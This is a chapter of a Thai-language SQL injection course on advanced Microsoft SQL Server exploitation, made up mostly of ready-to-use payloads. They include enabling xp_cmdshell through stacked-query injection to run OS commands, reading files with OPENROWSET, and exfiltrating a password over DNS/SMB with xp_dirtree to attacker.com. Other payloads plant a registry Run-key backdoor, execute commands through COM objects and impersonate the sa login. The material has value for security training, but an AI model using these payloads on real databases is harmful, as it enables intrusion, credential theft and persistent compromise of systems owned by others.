# Part 020: MSSQL Advanced Exploitation

## ภาพรวม

Microsoft SQL Server มีความสามารถพิเศษหลายอย่างที่ทำให้การ exploit ได้ผลมากกว่า databases อื่น

**ขั้นตอนที่ 246-265**

---

## 246. MSSQL พื้นฐาน

```sql
-- syntax ต่างจาก MySQL
SELECT TOP 1 name FROM sysdatabases;  -- แทน LIMIT
SELECT name + ':' + value FROM table;  -- + สำหรับ concat
SELECT CONVERT(varchar, GETDATE());    -- type conversion

-- System databases
-- master  - ข้อมูล system-wide
-- tempdb  - temp tables
-- model   - template สำหรับ databases ใหม่
-- msdb    - SQL Agent jobs
```

---

## 247. MSSQL Enumeration

```sql
-- ข้อมูล system
SELECT @@version;
SELECT @@servername;
SELECT DB_NAME();
SELECT USER_NAME();
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Databases
SELECT name FROM sys.databases;
SELECT name FROM master..sysdatabases;

-- Tables
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
SELECT name FROM sysobjects WHERE xtype='U';

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Users
SELECT name, password_hash FROM sys.sql_logins;
SELECT name FROM sys.server_principals WHERE type='S';
```

---

## 248. xp_cmdshell - OS Command Execution

### 48.1 Enable xp_cmdshell

```sql
-- ต้องการ sysadmin privilege
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- รัน command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'id';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';
```

### 48.2 ผ่าน SQL Injection (Stacked Queries)

```sql
-- inject stacked queries
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--

-- เก็บผลลัพธ์ใน temp table
'; CREATE TABLE #cmd_result (output varchar(8000));--
'; INSERT INTO #cmd_result EXEC xp_cmdshell 'net user';--
'; SELECT output FROM #cmd_result;-- (อ่านผ่าน union)
```

### 48.3 Disable หลังใช้

```sql
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
```

---

## 249. OPENROWSET BULK - File Read

```sql
-- อ่านไฟล์ผ่าน OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;

-- SINGLE_NCLOB สำหรับ Unicode files
SELECT * FROM OPENROWSET(BULK 'C:\file.txt', SINGLE_NCLOB) AS x;

-- ผ่าน injection
'; SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;--
```

---

## 250. xp_dirtree - SMB/DNS Exfiltration

```sql
-- ดึง file listing
EXEC xp_dirtree 'C:\Windows';
EXEC xp_dirtree 'C:\inetpub\wwwroot';

-- DNS Exfiltration ผ่าน UNC path
EXEC xp_dirtree '\\ATTACKER_IP\share';

-- DNS lookup พร้อมข้อมูล
DECLARE @q varchar(1024);
SELECT @q = DB_NAME();
EXEC xp_dirtree ('\\' + @q + '.attacker.com\share');

-- ผ่าน injection (Stacked Queries)
'; EXEC xp_dirtree '\\attacker.com\share';--
'; DECLARE @q varchar(100); SET @q=(SELECT TOP 1 password FROM users); EXEC xp_dirtree ('\\'+@q+'.attacker.com\share');--
```

---

## 251. Linked Servers

```sql
-- ดู linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked=1;

-- query ผ่าน linked server
SELECT * FROM [LINKED_SERVER].[database].[schema].[table];

-- execute SP ผ่าน linked server
EXEC [LINKED_SERVER].master.dbo.xp_cmdshell 'whoami';

-- สร้าง linked server ใหม่
EXEC sp_addlinkedserver 
  @server='ATTACKER', 
  @srvproduct='',
  @provider='SQLNCLI',
  @datasrc='192.168.1.100';
```

---

## 252. Dangerous Stored Procedures

```sql
-- xp_regread - อ่าน registry
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName';

-- xp_regwrite - เขียน registry (สร้าง backdoor)
EXEC xp_regwrite 
  'HKEY_LOCAL_MACHINE',
  'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
  'Backdoor',
  'REG_SZ',
  'C:\backdoor.exe';

-- sp_OACreate - COM Object execution
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\output.txt';
EXEC sp_OADestroy @shell;
```

---

## 253. Privilege Escalation

```sql
-- ตรวจสอบ role
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('serveradmin');
SELECT IS_SRVROLEMEMBER('db_owner');

-- EXECUTE AS สำหรับ impersonation
SELECT grantee_principal_id, grantor_principal_id 
FROM sys.server_permissions WHERE permission_name='IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN='sa';
SELECT IS_SRVROLEMEMBER('sysadmin'); -- ควรได้ 1
REVERT; -- กลับมาเป็น user เดิม
```

---

## 254. MSSQL Error-Based Extraction

```sql
-- CONVERT error
1 AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables));

-- CAST error
1 AND 1=CAST((SELECT TOP 1 username FROM users) AS int);

-- XML/FOR XML PATH
1 AND 1=(SELECT 1 FROM (SELECT 
  (SELECT TOP 1 username FROM users FOR XML PATH('')) AS x
) y);
```

---

## 255. แบบฝึกหัด MSSQL

```sql
-- ทดสอบ basic injection
'; SELECT @@version--
' UNION SELECT @@version,NULL,NULL--

-- ทดสอบ stacked queries
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--

-- xp_cmdshell ถ้ามี permission
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--  
'; EXEC xp_cmdshell 'whoami';--
```

---

## สรุป

MSSQL Advanced:
- **xp_cmdshell** - OS command execution (powerful แต่ต้องการ sysadmin)
- **OPENROWSET** - file read
- **xp_dirtree** - SMB/DNS exfiltration
- **Linked Servers** - lateral movement
- **EXECUTE AS** - privilege escalation

---

*Part 020 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
